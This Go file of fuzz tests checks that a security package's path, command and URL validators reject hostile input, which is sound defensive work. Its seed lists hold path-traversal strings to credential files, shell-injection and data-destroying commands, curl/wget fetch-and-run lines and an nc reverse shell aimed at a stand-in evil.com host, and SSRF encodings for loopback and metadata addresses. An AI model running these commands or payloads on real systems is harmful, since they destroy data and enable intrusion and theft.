package security

import (
	"net"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// FuzzPathValidation tests path validation against malicious inputs.
// Run with: go test -fuzz=FuzzPathValidation -fuzztime=30s ./internal/security/
func FuzzPathValidation(f *testing.F) {
	// Seed corpus with known attack vectors
	seedCorpus := []string{
		// Basic traversal
		"../../../etc/passwd",
		"..\\..\\..\\etc\\passwd",
		"....//....//....//etc/passwd",
		"..%2f..%2f..%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",

		// Null byte injection
		"/tmp/safe.txt\x00/etc/passwd",
		"file.txt\x00.exe",

		// Unicode attacks
		"..%c0%af..%c0%af..%c0%afetc/passwd",
		"..%c1%9c..%c1%9c..%c1%9cetc/passwd",
		"..／..／..／etc/passwd", // fullwidth solidus

		// Path normalization bypass
		"/tmp/./test/../../../etc/passwd",
		"/tmp/test/....//....//etc/passwd",
		"/.../etc/passwd",
		"/..../etc/passwd",

		// Device files
		"/dev/null",
		"/dev/zero",
		"/dev/urandom",

		// Sensitive paths
		"/etc/shadow",
		"/etc/passwd",
		"/proc/self/environ",
		"/sys/kernel/debug",

		// Windows paths
		"C:\\Windows\\System32\\config\\SAM",
		"\\\\server\\share\\file",
		"file:///etc/passwd",

		// Edge cases
		"",
		"/",
		".",
		"..",
		"~",
		"~root",
		"~/../etc/passwd",

		// Long paths
		strings.Repeat("a", 1000),
		strings.Repeat("../", 100),
	}

	for _, seed := range seedCorpus {
		f.Add(seed)
	}

	// Create a validator with a safe temporary directory
	tmpDir := f.TempDir()
	validator, err := NewPath([]string{tmpDir}, nil)
	if err != nil {
		f.Fatalf("creating validator: %v", err)
	}

	f.Fuzz(func(t *testing.T, input string) {
		result, err := validator.Validate(input)

		// Property 1: Any validated path must exist within allowed directories
		if err == nil {
			// The result must be an absolute path
			if !filepath.IsAbs(result) {
				t.Errorf("validated path is not absolute: %q", result)
			}

			// The result must be within allowed directories
			if !strings.HasPrefix(result, tmpDir) && !strings.HasPrefix(result, validator.workDir) {
				t.Errorf("validated path escapes allowed directories: %q", result)
			}
		}

		// Property 2: Sensitive system paths must ALWAYS be rejected
		sensitivePaths := []string{"/etc", "/proc", "/sys", "/dev", "/root", "/var/log"}
		cleanInput := filepath.Clean(input)
		for _, sensitive := range sensitivePaths {
			if strings.HasPrefix(cleanInput, sensitive) || strings.Contains(cleanInput, sensitive+"/") {
				if err == nil {
					// Only fail if the result actually leads to a sensitive path
					if strings.HasPrefix(result, sensitive) {
						t.Errorf("sensitive path not blocked: input=%q result=%q", input, result)
					}
				}
			}
		}

		// Property 3: Null bytes should always cause rejection or be stripped
		if strings.Contains(input, "\x00") {
			if err == nil && strings.Contains(result, "\x00") {
				t.Errorf("null byte not stripped: input=%q result=%q", input, result)
			}
		}
	})
}

// FuzzPathValidationWithSymlinks tests symlink handling.
func FuzzPathValidationWithSymlinks(f *testing.F) {
	f.Add("link_to_etc")
	f.Add("nested/deep/symlink")
	f.Add("circular_link")

	f.Fuzz(func(t *testing.T, linkName string) {
		// Skip invalid link names
		if linkName == "" || strings.Contains(linkName, "/") || strings.Contains(linkName, "\\") {
			return
		}
		if strings.Contains(linkName, "\x00") {
			return
		}

		tmpDir := t.TempDir()
		validator, err := NewPath([]string{tmpDir}, nil)
		if err != nil {
			t.Skipf("creating validator: %v", err)
		}

		// Create a symlink pointing outside allowed directories
		linkPath := filepath.Join(tmpDir, linkName)
		err = os.Symlink("/etc/passwd", linkPath)
		if err != nil {
			t.Skipf("creating symlink: %v", err)
		}

		// Validation should fail because symlink points outside allowed dirs
		_, err = validator.Validate(linkPath)
		if err == nil {
			t.Errorf("symlink to /etc/passwd was not blocked: link=%q", linkPath)
		}
	})
}

// =============================================================================
// Command Fuzzing Tests
// =============================================================================

// FuzzCommandValidation tests command validation against injection attempts.
// Run with: go test -fuzz=FuzzCommandValidation -fuzztime=30s ./internal/security/
func FuzzCommandValidation(f *testing.F) {
	// Seed corpus with known attack vectors
	cmdSeeds := []struct {
		cmd  string
		args string
	}{
		// Basic commands
		{"ls", "-la"},
		{"which", "go"},

		// Shell injection in command name
		{"; rm -rf /", ""},
		{"ls; rm -rf /", ""},
		{"ls | cat /etc/passwd", ""},
		{"$(whoami)", ""},
		{"`whoami`", ""},
		{"ls && rm -rf /", ""},

		// Dangerous commands
		{"rm", "-rf /"},
		{"rm", "-rf /*"},
		{"dd", "if=/dev/zero of=/dev/sda"},
		{"mkfs", "/dev/sda"},
		{"shutdown", "-h now"},
		{"reboot", ""},

		// Not in whitelist
		{"python", "-c 'import os; os.system(\"rm -rf /\")'"},
		{"curl", "http://evil.com/malware.sh | bash"},
		{"wget", "-O- http://evil.com/malware.sh | sh"},
		{"nc", "-e /bin/sh evil.com 4444"},

		// Null byte injection
		{"ls\x00rm", "-rf /"},
		{"ls", "file.txt\x00/etc/passwd"},

		// Long arguments
		{"ls", strings.Repeat("A", 20000)},

		// Unicode tricks
		{"ls", "—help"}, // em dash instead of hyphen
		{"ｌｓ", "-la"},   // fullwidth characters
	}

	for _, seed := range cmdSeeds {
		f.Add(seed.cmd, seed.args)
	}

	validator := NewCommand()

	f.Fuzz(func(t *testing.T, cmd, args string) {
		argSlice := strings.Fields(args)
		err := validator.Validate(cmd, argSlice)

		// Property 1: Commands with shell metacharacters in name must be rejected
		shellMetachars := []string{";", "|", "&", "`", "$", "(", ")", "\n", ">", "<"}
		for _, char := range shellMetachars {
			if strings.Contains(cmd, char) {
				if err == nil {
					t.Errorf("shell metachar in cmd not blocked: cmd=%q char=%q", cmd, char)
				}
				return // One check is enough
			}
		}

		// Property 2: Commands not in whitelist must be rejected
		whitelist := map[string]bool{
			"ls":  true,
			"pwd": true, "cd": true, "tree": true,
			"date": true, "whoami": true, "hostname": true, "uname": true,
			"df": true, "du": true, "free": true, "top": true, "ps": true,
			"git": true,
			"go":  true, "npm": true, "yarn": true,
			"which": true, "whereis": true,
		}

		cmdLower := strings.ToLower(strings.TrimSpace(cmd))
		if cmdLower != "" && !whitelist[cmdLower] {
			if err == nil {
				t.Errorf("non-whitelisted command not blocked: cmd=%q", cmd)
			}
		}

		// Property 3: Dangerous argument patterns must be rejected
		fullArgs := strings.ToLower(strings.Join(argSlice, " "))
		dangerousPatterns := []string{"rm -rf /", "rm -rf /*", "rm -rf ~", "mkfs", "shutdown", "reboot"}
		for _, pattern := range dangerousPatterns {
			if strings.Contains(fullArgs, pattern) {
				if err == nil {
					t.Errorf("dangerous pattern in args not blocked: args=%q pattern=%q", args, pattern)
				}
			}
		}

		// Property 4: Null bytes must be rejected
		if strings.Contains(cmd, "\x00") || strings.Contains(args, "\x00") {
			if err == nil {
				t.Errorf("null byte not blocked: cmd=%q args=%q", cmd, args)
			}
		}

		// Property 5: Excessively long arguments must be rejected
		for _, arg := range argSlice {
			if len(arg) > maxArgLength {
				if err == nil {
					t.Errorf("excessively long argument not blocked: len=%d", len(arg))
				}
			}
		}
	})
}

// =============================================================================
// URL / SSRF Fuzzing Tests
// =============================================================================

// FuzzSafeDialContext tests the validateHost and checkIP functions that back
// SafeTransport's DNS-rebinding protection. This specifically targets IP format
// variations that might bypass SSRF checks.
//
// Run with: go test -fuzz=FuzzSafeDialContext -fuzztime=30s ./internal/security/
func FuzzSafeDialContext(f *testing.F) {
	// Seed with known bypass techniques for IP representation
	seeds := []string{
		// Loopback variants
		"127.0.0.1",
		"127.1",            // short form
		"127.000.000.001",  // zero-padded
		"0x7f000001",       // hex integer
		"0x7f.0.0.1",       // partial hex
		"0177.0.0.1",       // octal first octet
		"2130706433",       // decimal integer
		"017700000001",     // octal integer
		"::1",              // IPv6 loopback
		"::ffff:127.0.0.1", // IPv6-mapped IPv4
		"::ffff:7f00:1",    // IPv6-mapped hex
		"0:0:0:0:0:ffff:7f00:0001",
		"[::1]",              // bracketed IPv6
		"[::ffff:127.0.0.1]", // bracketed IPv6-mapped

		// Private network variants (10.0.0.0/8)
		"10.0.0.1",
		"10.255.255.255",
		"0xa.0.0.1",       // hex 10
		"012.0.0.1",       // octal 10
		"::ffff:10.0.0.1", // IPv6-mapped

		// Private network variants (172.16.0.0/12)
		"172.16.0.1",
		"172.31.255.255",
		"::ffff:172.16.0.1",

		// Private network variants (192.168.0.0/16)
		"192.168.0.1",
		"192.168.255.255",
		"::ffff:192.168.1.1",

		// Cloud metadata
		"169.254.169.254",
		"::ffff:169.254.169.254",

		// Unspecified
		"0.0.0.0",
		"::",

		// Public IPs (should be allowed)
		"8.8.8.8",
		"1.1.1.1",
		"93.184.216.34",
		"2606:2800:220:1:248:1893:25c8:1946",

		// Edge cases
		"",
		"localhost",
		"metadata.google.internal",
		"LOCALHOST",
		"lOcAlHoSt",

		// Unicode homoglyph tricks
		"ⅼocalhost", // U+217C instead of l
		"lоcalhost", // Cyrillic о instead of Latin o
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	validator := NewURL()

	f.Fuzz(func(t *testing.T, host string) {
		// validateHost must not panic
		err := validator.validateHost(host)

		// Property 1: Known loopback IPs must always be rejected
		if ip := net.ParseIP(host); ip != nil {
			if ip.IsLoopback() && err == nil {
				t.Errorf("loopback IP not blocked: %q", host)
			}
			// Property 2: Known private IPs must always be rejected
			if ip.IsPrivate() && err == nil {
				t.Errorf("private IP not blocked: %q", host)
			}
			// Property 3: Link-local must always be rejected
			if (ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast()) && err == nil {
				t.Errorf("link-local IP not blocked: %q", host)
			}
			// Property 4: Unspecified must always be rejected
			if ip.IsUnspecified() && err == nil {
				t.Errorf("unspecified IP not blocked: %q", host)
			}
		}

		// Property 5: Blocked hostnames must always be rejected (case-insensitive)
		hostLower := strings.ToLower(host)
		blockedHosts := []string{"localhost", "metadata.google.internal", "metadata.gce.internal", "metadata.internal"}
		for _, blocked := range blockedHosts {
			if hostLower == blocked && err == nil {
				t.Errorf("blocked host not rejected: %q", host)
			}
		}
	})
}

// FuzzURLValidation tests URL validation against SSRF bypass attempts.
// Run with: go test -fuzz=FuzzURLValidation -fuzztime=30s ./internal/security/
func FuzzURLValidation(f *testing.F) {
	seeds := []string{
		// Valid public URLs
		"https://example.com",
		"http://example.com/path?q=1",

		// Blocked schemes
		"ftp://example.com",
		"file:///etc/passwd",
		"javascript:alert(1)",
		"gopher://evil.com",

		// Loopback
		"http://127.0.0.1",
		"http://127.0.0.1:8080",
		"http://[::1]",

		// Private IPs
		"http://10.0.0.1",
		"http://172.16.0.1",
		"http://192.168.1.1",

		// Cloud metadata
		"http://169.254.169.254/latest/meta-data/",
		"http://metadata.google.internal",

		// Blocked hosts
		"http://localhost",
		"http://localhost:3000",

		// Edge cases
		"",
		"://",
		"http://",
		"http://0.0.0.0",
		"http://[::ffff:127.0.0.1]",

		// Encoding tricks
		"http://0x7f000001",      // 127.0.0.1 as hex
		"http://2130706433",      // 127.0.0.1 as decimal
		"http://017700000001",    // 127.0.0.1 as octal
		"http://[::ffff:7f00:1]", // IPv6-mapped IPv4 loopback
		"http://127.1",           // short form loopback
		"http://0x7f.0.0.1",      // partial hex loopback
		"http://0177.0.0.1",      // octal first octet
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	validator := NewURL()

	f.Fuzz(func(t *testing.T, rawURL string) {
		// Must not panic
		_ = validator.Validate(rawURL)
	})
}
